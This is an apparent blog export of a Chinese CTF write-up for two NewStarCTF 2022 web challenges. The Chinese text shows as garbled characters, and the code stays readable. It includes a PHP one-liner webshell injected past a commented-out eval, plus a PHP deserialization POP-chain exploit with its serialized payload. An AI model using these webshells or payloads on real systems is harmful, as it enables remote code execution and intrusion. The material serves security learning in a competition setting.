{"title":"NewStarCTF2022å…¬å¼€èµ›-wp","uid":"8d801008e226a8eb98ad443ed169bddb","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","updated":"2023-08-06T08:01:55.254Z","comments":true,"path":"api/articles/2022NewStarCTF.json","keywords":null,"cover":"/img/40.jpg","content":"<p><code>æ²¡å•¥ç®€ä»‹</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"NewStarCTF2022å…¬å¼€èµ›\"><a href=\"#NewStarCTF2022å…¬å¼€èµ›\" class=\"headerlink\" title=\"NewStarCTF2022å…¬å¼€èµ›\"></a>NewStarCTF2022å…¬å¼€èµ›</h1><p><code>è™½ç„¶æ˜¯åˆ«äººå­¦æ ¡çš„æ–°ç”Ÿèµ›ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šå€¼å¾—å­¦ä¹ çš„çŸ¥è¯†ç‚¹</code></p>\n<h2 id=\"1-NotPHP\"><a href=\"#1-NotPHP\" class=\"headerlink\" title=\"1.NotPHP\"></a>1.NotPHP</h2><pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);\n<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">\"Welcome to CTF\"</span>)&#123;\n    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) && <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])&#123;\n        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) && <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)&#123;\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"Hack Me\"</span>;\n            <span class=\"keyword\">eval</span>(<span class=\"string\">\"#\"</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);\n        &#125;<span class=\"keyword\">else</span>&#123;\n            <span class=\"keyword\">die</span>(<span class=\"string\">\"Number error!\"</span>);\n        &#125;\n    &#125;<span class=\"keyword\">else</span>&#123;\n        <span class=\"keyword\">die</span>(<span class=\"string\">\"Wrong Key!\"</span>);\n    &#125;\n&#125;<span class=\"keyword\">else</span>&#123;\n    <span class=\"keyword\">die</span>(<span class=\"string\">\"Pass it!\"</span>);\n&#125;</code></pre>\n\n<p>è¿™é‡Œç»•è¿‡ä¸ç»†è®²ï¼Œéƒ½æ˜¯å¸¸è§çš„</p>\n<pre class=\" language-highlight php\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\"><code class=\"language-highlight php\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</code></pre>\n\n<p>ç»†è®²è¿™ä¸ª</p>\n<p>è¿™ä¸ªæ˜¯ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢å…¶å®å·²ç»è¢«<code>#</code>ç»™æ³¨é‡Šæ‰äº†ï¼Œ</p>\n<p>æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡ç»“æœ</p>\n<hr>\n<p>å› æ­¤éœ€è¦é—­åˆæˆ–è€…ç»•è¿‡<code>#</code></p>\n<p>ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šé—­åˆæ–¹å¼ï¼Œç»“æœéƒ½æ²¡ååº”</p>\n<p>æœ€åå‘ç°</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">?></code></pre>\n\n<p>å®ç°äº†è¯­å¥é—­åˆï¼Œ</p>\n<p>ä½†æ˜¯ï¼Œå½“æŠŠè¿™ä¸ªphpç»“å°¾ç¬¦åŠ åˆ°åé¢æ—¶å€™ï¼Œè¿™ä¸ªphpå°±å°±ç»“æŸäº†</p>\n<p>ä»¥</p>\n<pre class=\" language-highlight php\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\"><code class=\"language-highlight php\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</code></pre>\n\n<p>ä¸ºä¾‹å­</p>\n<pre class=\" language-highlight html\"><code class=\"language-highlight html\">url/xxx&cmd=?>haha</code></pre>\n\n<p>å½“æˆ‘ä»¬é—­åˆäº†phpä»£ç åï¼Œé‚£åé¢çš„<code>haha</code>çš„ä½ç½®åœ¨å“ªé‡Œå‘¢</p>\n<p><img src=\"/post/2022NewStarCT/image-20220921083750913.png\" alt=\"image-20220921083750913\"></p>\n<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>haha</code>å˜æˆäº†<code>html</code>ä»£ç </p>\n<p>é‚£ä¹ˆå°±å¯ä»¥æ“ä½œäº†ï¼Œ</p>\n<p>æ¯”å¦‚xssï¼Œä¸€å¥è¯ğŸçš„æ’å…¥ç­‰</p>\n<p>xssæˆ‘è¯•äº†ï¼Œæ²¡æœ‰ç»“æœï¼Œç°åœ¨çš„xssåˆ©ç”¨å±‚é¢å’Œå±å®³ä¹Ÿä¸é«˜äº†ï¼ˆå¯èƒ½æ˜¯æˆ‘æŠ€æœ¯ä¸åˆ°ä½ï¼‰</p>\n<hr>\n<p>æ’å…¥ä¸€å¥è¯ğŸ</p>\n<p>å¼€å§‹å› ä¸ºæ˜¯<code>html</code>ï¼Œæˆ‘æ˜¯è¯•äº†<code>jsp</code>ä¸€å¥è¯</p>\n<pre class=\" language-highlight jsp\">&lt;script language=<span class=\"string\">&quot;php&quot;</span>&gt;<span class=\"meta\"><code class=\"language-highlight jsp\">&lt;script language=<span class=\"string\">&quot;php&quot;</span>&gt;<span class=\"meta\">@eval($_POST[\"cmd\"])</span>;</script></code></pre>\n\n<p>ä½†æ˜¯ç”¨èšå‰‘è¿ä¸ä¸Š</p>\n<p>æœ€åæŒ‰ç…§ä¼ ç»Ÿæ€è·¯ï¼Œæˆ‘åœ¨åé¢æ’å…¥<code>php</code>ä¸€å¥è¯</p>\n<pre class=\" language-highlight php\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;cmd&quot;</span>]);<span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;cmd&quot;</span>]);<span class=\"meta\">?></span></code></pre>\n\n<p>å¥½å®¶ä¼™ï¼Œä¼ ç»Ÿæ€è·¯ï¼Œæ‰æ˜¯çœŸ</p>\n<p>è¿æ¥æˆåŠŸæ‹¿åˆ°<code>flag</code></p>\n<hr>\n<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„åŒå­¦çœ‹åˆ°è¿™ä¸ª<code>wp</code>ï¼Œæé†’ä¸€ä¸‹ï¼Œè¿™é‡Œéœ€è¦åœ¨<code>http body</code>é‡Œè¡¥å……<code>num</code>è¯·æ±‚ä¿¡æ¯</p>\n<p>å› ä¸ºè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„ä¸€ä¸ªç¯èŠ‚</p>\n<p><img src=\"/post/2022NewStarCT/image-20220921084836402.png\" alt=\"image-20220921084836402\"></p>\n<hr>\n<h2 id=\"2-UnserializeOne\"><a href=\"#2-UnserializeOne\" class=\"headerlink\" title=\"2.UnserializeOne\"></a>2.UnserializeOne</h2><p>ä¸€é“<code>popchain</code>ï¼Œè¿™è¿˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åš<code>popchain</code>ç±»ã€æƒ­æ„§ï¼Œä¸è¿‡åšç€çœŸæœ‰æ„æ€ã€‘</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);\n<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n<span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">echo</span> <span class=\"string\">\"Welcome to NewStarCTF, \"</span>.<span class=\"variable language_\">$this</span>->name;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        (<span class=\"variable language_\">$this</span>->func)();\n    &#125;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->obj-><span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-><span class=\"keyword\">var</span>);\n        <span class=\"keyword\">return</span> <span class=\"string\">\"CTFers\"</span>;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);\n    &#125;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];\n    &#125;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>->obj->cmd))&#123;\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;\n        &#125;\n    &#125;\n&#125;\n\n<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]))&#123;\n    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);\n&#125;</code></pre>\n\n<p>æ„é€ <code>pop</code>é“¾ä¸»è¦åœ¨äºï¼Œ</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">æŠŠæˆ‘ä»¬éœ€è¦è§¦å‘çš„é­”æœ¯æ–¹æ³•è”ç³»åœ¨ä¸€èµ·ï¼Œè€Œä¸”åœ¨è”ç³»è§¦å‘è¿‡ç¨‹ä¸­ä¹Ÿè¦è®°å¾—å®ä¾‹åŒ–ç›®æ ‡ç±»ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨å’Œæ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•</code></pre>\n\n\n\n<p>æˆ‘ä»¬å…ˆä¸­æ¯ä¸ªç±»å…¶ä¸­çš„é­”æœ¯æ–¹æ³•åˆ—å‡ºæ¥çœ‹çœ‹ï¼Œå†åˆ†æä¸€ä¸‹</p>\n<p><code>Start</code></p>\n<pre class=\" language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\"><code class=\"language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">     //<span class=\"title\">__destruct</span>(<span class=\"params\"></span>)ï¼Œå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œä¹Ÿå°±æ˜¯æœ€åè¿è¡Œç»“æŸæ—¶è§¦å‘</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">echo</span> <span class=\"string\">\"Welcome to NewStarCTF, \"</span>.<span class=\"variable language_\">$this</span>->name;\n      <span class=\"comment\">//è¿™é‡Œè¿›è¡Œecho $this->nameï¼Œå¦‚æœ$this->nameæ˜¯ä¸€ä¸ªç±»å°±ä¼šè°ƒç”¨Sec()ç±»é‡Œ__toString()</span>\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span>\n<span class=\"function\">   //<span class=\"title\">__isset</span>(<span class=\"params\"></span>)ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class=\"title\">isset</span>(<span class=\"params\"></span>)æˆ–<span class=\"title\">empty</span>(<span class=\"params\"></span>)æ—¶è°ƒç”¨</span>\n<span class=\"function\">    </span>&#123;\n        (<span class=\"variable language_\">$this</span>->func)();\n        <span class=\"comment\">//è¿™é‡ŒæŠŠ$this->funcå½“ä½œä¸€ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œ$this->func()</span>\n        <span class=\"comment\">//å¦‚æœ$this->funcä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°åï¼Œå°±ä¼šè°ƒç”¨Secç±»é‡Œ__invoke()</span>\n    &#125;\n&#125;</code></pre>\n\n<p><code>Sec</code></p>\n<pre class=\" language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\"><code class=\"language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">  //<span class=\"title\">__toString</span>(<span class=\"params\"></span>)ï¼ŒæŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘ï¼Œ</span>\n<span class=\"function\">  //æ‰€ä»¥åœ¨<span class=\"title\">Start</span>ç±»ä¸­çš„[<span class=\"title\">echo</span> \"<span class=\"title\">Welcome</span> <span class=\"title\">to</span> <span class=\"title\">NewStarCTF</span>, \".$<span class=\"title\">this</span>-><span class=\"title\">name</span></span>;]ï¼Œå°±éœ€è¦æŠŠnameå€¼èµ‹å€¼ä¸ºSecç±»å\n    &#123;\n        <span class=\"variable language_\">$this</span>->obj-><span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-><span class=\"keyword\">var</span>);\n       <span class=\"comment\">//è¿™é‡Œæƒ³è°ƒç”¨this->objçš„checkæ–¹æ³•</span>\n        <span class=\"keyword\">return</span> <span class=\"string\">\"CTFers\"</span>;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">     //<span class=\"title\">__invoke</span>(<span class=\"params\"></span>)ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span>\n<span class=\"function\">   //æ‰€ä»¥åœ¨<span class=\"title\">Start</span>ç±»ä¸­çš„[$<span class=\"title\">this</span>-><span class=\"title\">func</span>)(<span class=\"params\"></span>)</span>;]ä¸­ï¼Œéœ€è¦æŠŠfuncå€¼èµ‹å€¼ä¸ºSecï¼Œä»è€ŒæŠŠå…¶å½“ä½œå‡½æ•°æ‰§è¡Œæ—¶ï¼Œä»è€Œè§¦å…¶é­”æœ¯æ–¹æ³•\n    &#123;\n        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);\n      <span class=\"comment\">//è¿™é‡Œå°±æ˜¯ç›®æ ‡ï¼Œæ‰§è¡Œæ–‡ä»¶åŒ…å«flagè¾“å‡ºå†…å®¹</span>\n    &#125;\n&#125;</code></pre>\n\n<p><code>Easy</code></p>\n<pre class=\" language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\"><code class=\"language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span>\n<span class=\"function\">   //<span class=\"title\">__call</span>(<span class=\"params\"></span>)ï¼Œåœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span>\n<span class=\"function\">   //æ‰€ä»¥åœ¨<span class=\"title\">Sec</span>ç±»ä¸­ï¼Œå½“<span class=\"title\">this</span>-><span class=\"title\">obj</span>èµ‹å€¼ä¸º<span class=\"title\">Easy</span>ç±»æ—¶ï¼Œè°ƒç”¨<span class=\"title\">check</span>æ–¹æ³•æ—¶ï¼Œå°±ä¼šè§¦å‘ï¼Œå› ä¸º<span class=\"title\">Easy</span>é‡Œæ²¡æœ‰<span class=\"title\">check</span>å‡½æ•°</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];\n        <span class=\"comment\">//è¿™é‡Œè°ƒç”¨cloneï¼Œå½“å¯¹è±¡å®Œæˆå¤åˆ¶æ—¶ä¼šæ‰§è¡Œeeeeé‡Œçš„__clone</span>\n    &#125;\n&#125;</code></pre>\n\n<p><code>eeee</code></p>\n<pre class=\" language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\"><code class=\"language-highlight php\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>->obj->cmd))&#123;\n            <span class=\"comment\">//è¿™é‡Œæ˜¯å¯¹$this->objçš„cmdå±æ€§ä½¿ç”¨issetå‡½æ•°ï¼Œä½†æ˜¯å¹¶ä¸å­˜åœ¨cmdå±æ€§</span>\n            <span class=\"comment\">//æ‰€ä»¥æŠŠthis->objèµ‹å€¼ä¸ºStratç±»åï¼Œä»è€Œè§¦å‘__isset</span>\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;\n        &#125;\n    &#125;\n&#125;</code></pre>\n\n\n\n<p>æ•´ç†ä¸€ä¸‹</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">Start::__destruct\n\n==>\n\nSec::__toString\n\n==>\n\nEasy::__call\n\n==>\n\neeee::__clone\n\n==>\n\nStart::__isset\n\n==>\n\nSec::__invoke</code></pre>\n\n<p>äºæ˜¯<code>payload</code>ä¸º</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);\n<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n<span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$var</span>;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;\n&#125;\n\n<span class=\"variable\">$start</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Start</span>();\n<span class=\"variable\">$sec</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();\n<span class=\"variable\">$easy</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Easy</span>();\n<span class=\"variable\">$eeee</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">eeee</span>();\n\n<span class=\"variable\">$start</span>->name=<span class=\"variable\">$sec</span>;\n<span class=\"variable\">$start</span>->func=<span class=\"variable\">$sec</span>;\n\n<span class=\"variable\">$sec</span>->obj=<span class=\"variable\">$easy</span>;\n<span class=\"variable\">$sec</span>-><span class=\"keyword\">var</span>=<span class=\"variable\">$eeee</span>;\n\n<span class=\"variable\">$eeee</span>->obj=<span class=\"variable\">$start</span>;\n<span class=\"comment\">//å› ä¸ºè¿™é‡ŒæŠŠeeeeé‡Œçš„å˜é‡å¤åˆ¶ä¸ºå®ä¾‹åŒ–çš„Startçš„ç±»ï¼Œæ‰€ä»¥å¦‚æœä»eeeeç±»ä¸ºå¼€å§‹åºåˆ—åŒ–çš„å…¥å£ä¹Ÿæ˜¯å¯ä»¥çš„</span>\n\n<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$start</span>);\n<span class=\"comment\">//echo serialize($eeee);</span></code></pre>\n\n<p>å¾—åˆ°åºåˆ—åŒ–æ•°æ®ï¼Œ<code>post</code>ä¼ å…¥å°±è¡Œ</p>\n<pre class=\" language-highlight php\">O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;r:<span class=\"number\">1</span>;&#125;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;r:<span class=\"number\"><code class=\"language-highlight php\">O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;r:<span class=\"number\">1</span>;&#125;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;r:<span class=\"number\">2</span>;&#125;\n\n<span class=\"comment\">//O:4:\"eeee\":1:&#123;s:3:\"obj\";O:5:\"Start\":2:&#123;s:4:\"name\";O:3:\"Sec\":2:&#123;s:3:\"obj\";O:4:\"Easy\":1:&#123;s:3:\"cla\";N;&#125;s:3:\"var\";r:1;&#125;s:4:\"func\";r:3;&#125;&#125;</span></code></pre>\n\n<p><img src=\"/post/2022NewStarCT/image-20221027162117156.png\" alt=\"image-20221027162117156\"></p>\n<hr>\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"æ²¡å•¥ç®€ä»‹ NewStarCTF2022å…¬å¼€èµ›è™½ç„¶æ˜¯åˆ«äººå­¦æ ¡çš„æ–°ç”Ÿèµ›ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šå€¼å¾—å­¦ä¹ çš„çŸ¥è¯†ç‚¹ 1.NotPHP error_reportin...","permalink":"/post/2022NewStarCTF","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","slug":"ç½‘ç»œå®‰å…¨å­¦ä¹ ","count":26,"path":"api/categories/ç½‘ç»œå®‰å…¨å­¦ä¹ .json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NewStarCTF2022%E5%85%AC%E5%BC%80%E8%B5%9B\"><span class=\"toc-text\">NewStarCTF2022å…¬å¼€èµ›</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-NotPHP\"><span class=\"toc-text\">1.NotPHP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-UnserializeOne\"><span class=\"toc-text\">2.UnserializeOne</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"å¿…é¡»ä»è¿‡å»çš„é”™è¯¯å­¦ä¹ æ•™è®­ï¼Œè€Œéä¾èµ–è¿‡å»çš„æˆåŠŸ","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","text":"å›½å¤–æ¯”èµ›éš¾åº¦ç¡®å®é€†å¤© Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 è¿™æ˜¯å®˜æ–¹...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"8.7k","symbolsTime":"8 mins."},"categories":[{"name":"ç½‘ç»œå®‰å…¨å­¦ä¹ 